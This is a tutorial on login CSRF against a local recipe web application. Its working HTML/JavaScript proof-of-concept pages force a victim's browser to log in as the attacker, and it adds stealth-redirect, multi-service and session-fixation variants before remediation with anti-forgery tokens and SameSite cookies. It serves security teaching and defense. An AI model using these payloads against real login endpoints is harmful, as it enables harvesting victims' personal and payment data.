# Login CSRF Exploitation Tutorial

## 📚 Prerequisites
This tutorial assumes you've read the [previous CSRF tutorial](../create_recipe/1_hack.md) 

---

## What is Login CSRF?

**Login CSRF** is a special type of CSRF attack where the attacker forces the victim to log in as the **attacker's account** rather than their own.

### Traditional CSRF vs Login CSRF

| Traditional CSRF | Login CSRF |
|-----------------|------------|
| Victim is already logged in | Victim is NOT logged in |
| Performs actions as victim | Forces login as attacker |
| Steals/modifies victim's data | Victim unknowingly uses attacker's account |
| Immediate impact | Delayed impact (data poisoning) |

---

## Attack Scenario Walkthrough

### The Setup

```
┌─────────────┐
│  Attacker   │
│   Account   │
│             │
│ User: hacker│
│ Pass: ***   │
└─────────────┘
        │
        │ 1. Attacker creates account
        │    on victim's website
        ▼
┌─────────────────────────────────────┐
│     Victim's Recipe Application     │
│  http://localhost:4200              │
└─────────────────────────────────────┘
        ▲
        │ 2. Attacker creates malicious
        │    login page
        │
┌─────────────┐
│   Victim    │
│  (John Doe) │
└─────────────┘
```

### Step-by-Step Attack

**Phase 1: Attacker Preparation**
```
1. Attacker creates account: username="hacker", password="Hacker1234!"
2. Attacker crafts malicious HTML with login credentials
3. Attacker hosts HTML at: http://localhost:8888/csrf-login.html
4. Attacker sends link to victim (via email, social media, etc.)
```

**Phase 2: Victim Interaction**
```
5. Victim clicks link to http://localhost:8888/csrf-login.html
6. JavaScript executes immediately
7. POST request sent to http://localhost:4200/bff/account/login
8. Request contains attacker's credentials (hacker/Hacker1234!)
9. Victim is now logged in as "hacker" (attacker's account)
10. Victim doesn't notice - everything looks normal
```

**Phase 3: Data Poisoning**
```
11. Victim uses the application normally
12. Victim creates recipes, uploads photos, adds personal notes
13. All data is saved to attacker's account
14. Victim closes browser (thinking they were logged in as themselves)
```

**Phase 4: Attacker Harvests Data**
```
15. Attacker logs in as "hacker"
16. Attacker sees all the victim's data
17. Victim's recipes, photos, notes are now in attacker's account
18. Attacker can download, sell, or misuse the data
```

---

## Understanding the PoC

```html
<script>
    var xhr = new XMLHttpRequest();
    // Target the login endpoint
    xhr.open("POST", "http://localhost:4200/bff/account/login", true);
    
    // Send cookies (though victim isn't logged in yet)
    xhr.withCredentials = true; 
    
    xhr.setRequestHeader("Content-Type", "application/json");
    
    xhr.onload = function() {
        // Success! Victim is now logged in as "hacker"
        document.getElementById("result").innerHTML =                 
            "<p><strong>Status:</strong> " + xhr.status + "</p>" +
            "<p><strong>Response:</strong></p><pre>" + 
            xhr.responseText + "</pre>";                
    };
    
    // Send attacker's credentials
    xhr.send(JSON.stringify({
        userName: "hacker",
        password: "Hacker1234!"
    }));
</script>
```

### Key Differences from Recipe CSRF

| Aspect | Recipe CSRF | Login CSRF |
|--------|-------------|------------|
| Victim state | Already authenticated | Not authenticated |
| Credentials | Victim's (automatic) | Attacker's (in request) |
| Target action | Create recipe | Establish session |
| Immediate effect | Malicious data created | Session established |
| Victim awareness | None | None |
| Long-term impact | One malicious record | All future actions poisoned |

---

## Why This is Dangerous

### Real-World Impact Examples

**1. E-Commerce Site**
```
Attacker's goal: Get victim's credit card info

1. Force victim to log in as attacker's account
2. Victim adds items to cart
3. Victim enters shipping address
4. Victim enters credit card details
5. Victim completes purchase
6. Attacker logs in and sees:
   - Victim's full name
   - Shipping address
   - Last 4 digits of credit card
   - Billing address
   - Purchase history
```

**2. Banking Application**
```
Attacker's goal: Link victim's bank account

1. Force victim to log in as attacker's account
2. Victim links their bank account to "their" profile
3. Victim sets up automatic payments
4. Attacker now has access to victim's bank details
5. Attacker can initiate transfers
```

**3. Your Recipe Application**
```
Attacker's goal: Harvest personal recipes and photos

1. Force victim to log in as "hacker"
2. Victim creates family recipes (grandmother's secret recipe)
3. Victim uploads family photos
4. Victim adds personal notes ("Mom's birthday surprise")
5. Attacker logs in and downloads everything
6. Attacker could:
   - Sell recipes to competitors
   - Use photos for identity theft
   - Blackmail victim with private information
```

---

## Testing the Attack

### Setup

**1. Create Attacker Account**
```bash
# Start your application
cd Recipes.Bff && dotnet run

# In browser, navigate to http://localhost:4200
# Register new account:
Username: hacker
Password: Hacker1234!

# Log out after creating account
```

**2. Prepare Attack Page**

Save the PoC HTML as `csrf-login.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>CSRF Attack via JSON</h1>
    <p>Executing attack...</p>
    <div id="result" class="result">Waiting for response...</div>
    
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost:4200/bff/account/login", true);
        xhr.withCredentials = true; 
        xhr.setRequestHeader("Content-Type", "application/json");
        
        xhr.onload = function() {
            document.getElementById("result").innerHTML =                 
                "<p><strong>Status:</strong> " + xhr.status + "</p>" +
                "<p><strong>Response:</strong></p><pre>" + 
                xhr.responseText + "</pre>";                
        };
        
        xhr.onerror = function() {
            document.getElementById("result").innerHTML = 
                "<h3>Request sent (may have succeeded)</h3>" +
                "<p>Check your BFF logs to confirm if the attack worked.</p>";
        };
        
        xhr.send(JSON.stringify({
            userName: "hacker",
            password: "Hacker1234!"
        }));
    </script>
</body>
</html>
```

**3. Host Attack Page**
```bash
# In a separate terminal
cd /path/to/attack/files
python3 -m http.server 8888

# Attack available at: http://localhost:8888/csrf-login.html
```

**4. Execute Attack**

```
Victim's perspective:
1. Open CLEAN browser (or incognito window)
2. Do NOT log in to localhost:4200
3. Navigate to: http://localhost:8888/csrf-login.html
4. Watch the attack execute
5. Check if you're now logged in (go to localhost:4200)
```

### Expected Results

**Successful Attack:**
```
✓ Status: 200 OK
✓ Response contains authentication token/cookie
✓ Navigating to http://localhost:4200 shows you're logged in
✓ BUT you're logged in as "hacker", not as yourself
```

**Verification Steps:**
```bash
# 1. Check who you're logged in as
Navigate to: http://localhost:4200/profile
You should see: Username: hacker

# 2. Create a test recipe
Title: "Victim's Secret Recipe"
Description: "This should save to attacker's account"

# 3. Log out

# 4. Log back in as "hacker" with password "Hacker1234!"

# 5. Check recipes
You should see "Victim's Secret Recipe"
This proves the attack worked
```

---

## Vulnerability Analysis

### Why Login is Vulnerable

**1. No CSRF Protection on Login Endpoint**

The login endpoint likely looks like this:
```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await _userService.AuthenticateAsync(
        request.UserName, 
        request.Password
    );
    
    if (user == null)
        return Unauthorized();
    
    // ❌ NO CSRF token validation
    // ❌ Blindly creates session for any valid credentials
    
    var token = GenerateJwtToken(user);
    
    // Set authentication cookie
    Response.Cookies.Append("auth_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Lax  // ❌ Should be Strict
    });
    
    return Ok(new { success = true });
}
```

**Problems:**
- No anti-forgery token required
- Accepts credentials from any origin (due to permissive CORS)
- Sets authentication cookie for cross-origin requests
- SameSite=Lax allows some cross-site requests

**2. Permissive CORS (from previous tutorial)**
```csharp
policy.SetIsOriginAllowed(origin =>
{
    if (origin.StartsWith("http://localhost"))  // ❌ ANY localhost
        return true;
    // ...
})
.AllowCredentials();  // ❌ Sends cookies
```

---

## Advanced Attack Variations

### 1. Stealth Attack with Redirect

Make the attack invisible to the victim:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost:4200/bff/account/login", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");

xhr.onload = function() {
    if (xhr.status === 200) {
        // Attack succeeded, redirect to legitimate site
        window.location.href = "http://localhost:4200";
    }
};

xhr.send(JSON.stringify({
    userName: "hacker",
    password: "Hacker1234!"
}));
</script>
```

**Victim's experience:**
1. Clicks link
2. Briefly sees "Loading..."
3. Automatically redirected to localhost:4200
4. Sees the Recipe app (thinks link was just a shortcut)
5. Never realizes they're logged in as attacker

### 2. Multiple Account Poisoning

Attack multiple services at once:

```html
<script>
// Attack Recipe app
loginTo("http://localhost:4200/bff/account/login", "hacker", "Hacker1234!");

// Attack other services on different ports
loginTo("http://localhost:5000/api/login", "hacker", "Hacker1234!");
loginTo("http://localhost:3000/auth/login", "hacker", "Hacker1234!");

function loginTo(url, username, password) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({ userName: username, password: password }));
}
</script>
```

### 3. Session Fixation Combo

Combine login CSRF with session fixation:

```html
<script>
// 1. First, ensure victim has attacker's session ID
document.cookie = "session_id=attacker_controlled_value; path=/";

// 2. Then force login
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost:4200/bff/account/login", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({
    userName: "hacker",
    password: "Hacker1234!"
}));
</script>
```

---

## Remediation

### 1. Anti-Forgery Tokens on Login (Critical)

**Update Login Endpoint:**

```csharp
[HttpGet("login")]
public IActionResult GetLoginPage([FromServices] IAntiforgery antiforgery)
{
    var tokens = antiforgery.GetAndStoreTokens(HttpContext);
    return Ok(new { csrfToken = tokens.RequestToken });
}

[HttpPost("login")]
[ValidateAntiForgeryToken]  // ✅ Require CSRF token
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // Validation happens automatically via [ValidateAntiForgeryToken]
    
    var user = await _userService.AuthenticateAsync(
        request.UserName, 
        request.Password
    );
    
    if (user == null)
        return Unauthorized();
    
    var token = GenerateJwtToken(user);
    
    Response.Cookies.Append("auth_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict  // ✅ Changed to Strict
    });
    
    return Ok(new { success = true });
}
```

**Frontend Login Flow:**

```javascript
// 1. Get CSRF token before showing login form
async function initLoginPage() {
    const response = await fetch('http://localhost:4200/bff/account/login', {
        credentials: 'include'
    });
    const { csrfToken } = await response.json();
    
    // Store token for use in login
    sessionStorage.setItem('csrfToken', csrfToken);
}

// 2. Include token when submitting login
async function login(username, password) {
    const csrfToken = sessionStorage.getItem('csrfToken');
    
    const response = await fetch('http://localhost:4200/bff/account/login', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken  // ✅ Include token
        },
        body: JSON.stringify({ userName: username, password: password })
    });
    
    return response;
}
```

### 2. SameSite Cookie Configuration (Defense in Depth)

```csharp
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.SameSite = SameSiteMode.Strict;  // ✅ Blocks all cross-site
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.HttpOnly = true;
});

// Also update CSRF token cookie
builder.Services.AddAntiforgery(options =>
{
    options.Cookie.SameSite = SameSiteMode.Strict;  // ✅ Strict for login
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});
```

---

## Testing Your Defenses

### 1. Verify CSRF Token Protection

```bash
# This should FAIL (403 Forbidden)
curl -X POST http://localhost:4200/bff/account/login \
  -H "Content-Type: application/json" \
  -H "Origin: http://localhost:8888" \
  -d '{"userName":"hacker","password":"Hacker1234!"}'

# Expected: 403 Forbidden - Missing anti-forgery token
```

### 2. Verify SameSite Cookie Works

```bash
# 1. Log in legitimately to get cookie
# 2. Try to use cookie from different site
# 3. Should fail due to SameSite=Strict
```

### 3. Re-run Attack PoC

```
After implementing fixes:
1. Navigate to http://localhost:8888/csrf-login.html
2. Attack should fail with 403 or 400 error
3. Victim should NOT be logged in
4. Check http://localhost:4200 - no session exists
```

---

